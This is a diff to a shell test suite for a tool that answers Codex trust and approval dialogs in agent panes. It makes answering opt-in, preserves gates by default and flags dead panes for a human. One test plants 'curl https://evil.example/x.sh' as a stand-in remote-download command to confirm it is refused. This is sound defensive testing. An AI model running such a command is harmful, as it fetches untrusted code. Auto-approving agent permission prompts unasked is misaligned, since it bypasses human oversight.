@@ -74,6 +74,9 @@ case "$sub $op" in
       "$pane" "$(cat "$(pane_file "$pane.status")")"
     ;;
   'pane read')
+    # Only the visible viewport is served: a scrollback read would let a stale
+    # dialog drive the classification.
+    [ "${4:-} ${5:-}" = '--source visible' ] || { echo "fake herdr: pane read must ask for the visible viewport" >&2; exit 93; }
     [ -f "$(pane_file "$pane.prompt")" ] && cat "$(pane_file "$pane.prompt")"
     ;;
   'pane send-keys')
@@ -215,6 +218,22 @@ EOF
 > 1. Yes, continue
   2. No, quit
 
+  Press enter to continue
+EOF
+  cat > "$prompts/trust-stale-beside-approval" <<'EOF'
+  Do you trust the contents of this directory? Working with untrusted contents comes with higher risk of prompt
+  injection. Trusting the directory allows project-local config, hooks, and exec policies to load.
+
+  Allow Codex to run this command?
+
+  touch state/x
+
+> 1. Yes, continue
+  2. Yes, always
+  3. No, quit
+EOF
+  cat > "$prompts/trust-phrase-only" <<'EOF'
+  Do you trust the contents of this directory?
   Press enter to continue
 EOF
   cat > "$prompts/allow" <<EOF
@@ -1708,6 +1727,8 @@ EOF
     esac
   }
   classify trust 'trust' 'classifier accepts the live-verified trust dialog'
+  classify trust-stale-beside-approval 'unknown' 'classifier never reads a stale trust phrase beside another dialog as trust'
+  classify trust-phrase-only 'unknown' 'classifier needs the complete trust dialog shape, not the phrase alone'
   classify allow 'approve' 'classifier approves an allowlisted read'
   classify allow-find 'approve' 'classifier approves a plain find read'
   classify loop 'refuse:relative file token is not symlink-verifiable inside this home' 'classifier fails closed on a loop reading through a shell variable'
@@ -1960,7 +1981,7 @@ test_inventory_classification() {
   reco_add_meta "$home" t-tmux codex 'backend=tmux' "window=main:fm-t-tmux"
 
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "inventory run exits 2 while a seat needs a human"
   assert_contains "$out" 'seat t-work harness=codex pane='"$FIXTURE_SESSION"':w1:pt-work before=working after=working enters=0 no-action:working' \
     "working seat is reported without action"
@@ -1974,12 +1995,12 @@ test_inventory_classification() {
     "blocked non-codex harness is needs-human"
   assert_contains "$out" 'seat t-other harness=codex pane='"$FIXTURE_SESSION"':w1:pt-other before=unknown after=unknown enters=0 no-action:status unknown' \
     "unknown pane status is reported without action"
-  assert_contains "$out" 'seat t-nopane harness=codex pane='"$FIXTURE_SESSION"':w1:pt-nopane before=- after=- enters=0 no-pane' \
-    "a seat with no live pane is reported as no-pane"
+  assert_contains "$out" 'seat t-nopane harness=codex pane='"$FIXTURE_SESSION"':w1:pt-nopane before=- after=- enters=0 needs-human:no-pane' \
+    "a seat with no live pane is needs-human, never no-action"
   assert_contains "$out" 'seat t-unver harness=codex pane=- before=- after=- enters=0 needs-human:metadata lacks a provable herdr seat binding' \
     "unverifiable metadata is needs-human and never touched"
   assert_not_contains "$out" 't-tmux' "tmux-backed meta is out of scope entirely"
-  assert_contains "$out" 'summary: seats=8 recovered=1 needs-human=2 no-action=5' \
+  assert_contains "$out" 'summary: seats=8 recovered=1 needs-human=3 no-action=4' \
     "summary counts the inventory correctly"
   assert_equals 1 "$(reco_sends w1:pt-trust)" "exactly one Enter was sent to the trust seat"
   [ ! -f "$FIXTURE/panes/w1:pt-claude.sends" ] || fail "no Enter may reach a non-codex blocked seat"
@@ -1993,7 +2014,7 @@ test_duplicate_meta_key() {
   reco_add_meta "$home" t-dup codex
   printf 'endpoint_task_id=someone-else\n' >> "$home/state/t-dup.meta"
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "duplicate-key meta run exits 2"
   assert_contains "$out" 'needs-human:metadata lacks a provable herdr seat binding' \
     "an ambiguous duplicate-key meta is never driven"
@@ -2008,7 +2029,7 @@ test_status_read_failure() {
   reco_add_meta "$home" t-getfail codex
   touch "$FIXTURE/panes/w1:pt-getfail.getfail"
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "status-read failure run exits 2"
   assert_contains "$out" 'needs-human:pane status could not be read' \
     "an unreadable pane status is never labeled recovered"
@@ -2023,7 +2044,7 @@ test_status_unknown_after_enter() {
   printf 'status:unknown\n' > "$FIXTURE/panes/w1:pt-unk.queue"
   reco_add_meta "$home" t-unk codex
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "an unknown post-Enter status run exits 2"
   assert_contains "$out" 'seat t-unk harness=codex pane='"$FIXTURE_SESSION"':w1:pt-unk before=blocked after=unknown enters=1 needs-human:pane status unknown is not auto-recoverable' \
     "an unknown post-Enter status is needs-human, never recovered"
@@ -2039,7 +2060,7 @@ test_pane_get_shape_drift() {
   reco_add_meta "$home" t-gdrift codex
   touch "$FIXTURE/panes/w1:pt-gdrift.getdrift"
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "pane-get shape drift exits 2"
   assert_contains "$out" 'needs-human:pane status could not be read' \
     "a drifted pane get is never labeled recovered"
@@ -2054,7 +2075,7 @@ test_ambiguous_backend_meta() {
   reco_add_meta "$home" t-amb codex
   printf 'backend=tmux\n' >> "$home/state/t-amb.meta"
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "ambiguous-backend meta run exits 2"
   assert_contains "$out" 'seat t-amb harness=codex pane=- before=- after=- enters=0 needs-human:metadata lacks a provable herdr seat binding' \
     "an ambiguous backend meta is reported, never silently dropped"
@@ -2130,7 +2151,7 @@ test_allowlist_refusal_e2e() {
   sed -i "s|sed -n 1,50p .*|curl https://evil.example/x.sh|" "$FIXTURE/panes/w1:pt-refuse.prompt"
 
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "refused prompt run exits 2"
   assert_contains "$out" 'needs-human:command names a denied tool or topic' "the curl prompt is refused"
   [ ! -f "$FIXTURE/panes/w1:pt-refuse.sends" ] || fail "a refused prompt must never receive Enter"
@@ -2143,7 +2164,7 @@ test_unrecognized_prompt_e2e() {
   reco_add_pane w1:pt-unknown blocked "$UNRECOGNIZED_PROMPT"
   reco_add_meta "$home" t-unknown codex
   local out rc
-  out=$(reco_run "$home"); rc=$?
+  out=$(reco_run "$home" --approve-prompts); rc=$?
   expect_code 2 "$rc" "unrecognized prompt run exits 2"
   assert_contains "$out" 'needs-human:unrecognized prompt' "the unrecognized prompt is left for a human"
   [ ! -f "$FIXTURE/panes/w1:pt-unknown.sends" ] || fail "an unrecognized prompt must never receive Enter"
@@ -2160,7 +2181,7 @@ test_round_cap() {
   } > "$FIXTURE/panes/w1:pt-cap.queue"
   reco_add_meta "$home" t-cap codex
   local out rc
-  out=$(reco_run "$home" --max-rounds 2); rc=$?
+  out=$(reco_run "$home" --approve-prompts --max-rounds 2); rc=$?
   expect_code 2 "$rc" "round cap run exits 2"
   assert_contains "$out" 'needs-human:round cap (2) reached' "the round cap is reported"
   assert_equals 2 "$(reco_sends w1:pt-cap)" "the round cap bounds total Enters per seat"
@@ -2173,12 +2194,13 @@ test_idempotency() {
   reco_add_pane w1:pt-idem blocked "$TRUST_PROMPT"
   printf 'status:working\n' > "$FIXTURE/panes/w1:pt-idem.queue"
   reco_add_meta "$home" t-idem codex
-  local out1 out2
-  out1=$(reco_run "$home")
+  local out1 out2 rc
+  out1=$(reco_run "$home" --approve-prompts)
   assert_contains "$out1" 'seat t-idem harness=codex pane='"$FIXTURE_SESSION"':w1:pt-idem before=blocked after=working enters=1 recovered' \
     "first run recovers the seat"
   assert_equals 1 "$(reco_sends w1:pt-idem)" "first run sends one Enter"
-  out2=$(reco_run "$home")
+  out2=$(reco_run "$home" --approve-prompts); rc=$?
+  expect_code 0 "$rc" "a clean sweep with every seat resolved exits 0"
   assert_contains "$out2" 'seat t-idem harness=codex pane='"$FIXTURE_SESSION"':w1:pt-idem before=working after=working enters=0 no-action:working' \
     "second run is a no-op on the recovered seat"
   assert_equals 1 "$(reco_sends w1:pt-idem)" "second run sends nothing"
@@ -2191,10 +2213,45 @@ test_dry_run() {
   reco_add_pane w1:pt-dry blocked "$TRUST_PROMPT"
   reco_add_meta "$home" t-dry codex
   local out rc
-  out=$(reco_run "$home" --dry-run); rc=$?
+  out=$(reco_run "$home" --approve-prompts --dry-run); rc=$?
   expect_code 0 "$rc" "dry run never reports needs-human for an answerable prompt"
   assert_contains "$out" 'dry-run:would send Enter for the trust prompt' "dry run reports the would-send"
   [ ! -f "$FIXTURE/panes/w1:pt-dry.sends" ] || fail "dry run must not send keys"
+}
+
+test_gates_preserved_by_default() {
+  reco_fixture_init
+  local home=$TMP_ROOT/home
+  write_shared_prompts "$home"
+  reco_add_pane w1:pt-gtrust blocked "$TRUST_PROMPT"
+  reco_add_pane w1:pt-gappr blocked "$APPROVAL_PROMPT"
+  reco_add_meta "$home" t-gtrust codex
+  reco_add_meta "$home" t-gappr codex
+  local out rc
+  out=$(reco_run "$home"); rc=$?
+  expect_code 2 "$rc" "a sweep without --approve-prompts leaves classified gates unresolved"
+  assert_contains "$out" 'seat t-gtrust harness=codex pane='"$FIXTURE_SESSION"':w1:pt-gtrust before=blocked after=blocked enters=0 needs-human:trust prompt preserved' \
+    "the trust gate is preserved without the opt-in"
+  assert_contains "$out" 'seat t-gappr harness=codex pane='"$FIXTURE_SESSION"':w1:pt-gappr before=blocked after=blocked enters=0 needs-human:approve prompt preserved' \
+    "the approval gate is preserved without the opt-in"
+  [ ! -f "$FIXTURE/panes/w1:pt-gtrust.sends" ] || fail "no Enter may reach a trust gate without the opt-in"
+  [ ! -f "$FIXTURE/panes/w1:pt-gappr.sends" ] || fail "no Enter may reach an approval gate without the opt-in"
+}
+
+test_missing_pane_fails_sweep() {
+  reco_fixture_init
+  local home=$TMP_ROOT/home
+  write_shared_prompts "$home"
+  reco_add_pane w1:pt-live working
+  reco_add_meta "$home" t-live codex
+  reco_add_meta "$home" t-dead codex
+  local out rc
+  out=$(reco_run "$home" --approve-prompts); rc=$?
+  expect_code 2 "$rc" "a sweep with an unresolved dead seat exits nonzero"
+  assert_contains "$out" 'seat t-dead harness=codex pane='"$FIXTURE_SESSION"':w1:pt-dead before=- after=- enters=0 needs-human:no-pane' \
+    "the dead seat is named as needs-human"
+  assert_contains "$out" 'summary: seats=2 recovered=0 needs-human=1 no-action=1' \
+    "the dead seat is counted as needs-human, not no-action"
 }
 
 test_no_cross_home() {
@@ -2208,7 +2265,7 @@ test_no_cross_home() {
   reco_add_meta "$homeA" t-a codex 'herdr_tab_id=w1:ta' 'herdr_pane_id=w1:pa' "window=$FIXTURE_SESSION:w1:pa"
   reco_add_meta "$homeB" t-b codex 'herdr_tab_id=w1:tb' 'herdr_pane_id=w1:pb' "window=$FIXTURE_SESSION:w1:pb"
   local out
-  out=$(reco_run "$homeA")
+  out=$(reco_run "$homeA" --approve-prompts)
   assert_contains "$out" 'seat t-a harness=codex pane='"$FIXTURE_SESSION"':w1:pa before=blocked after=working enters=1 recovered' \
     "home A recovers its own seat"
   assert_not_contains "$out" 't-b' "home A never reports home B's seat"
@@ -2240,6 +2297,8 @@ test_unrecognized_prompt_e2e
 test_round_cap
 test_idempotency
 test_dry_run
+test_gates_preserved_by_default
+test_missing_pane_fails_sweep
 test_no_cross_home
 
 test_fake_isolation_guard
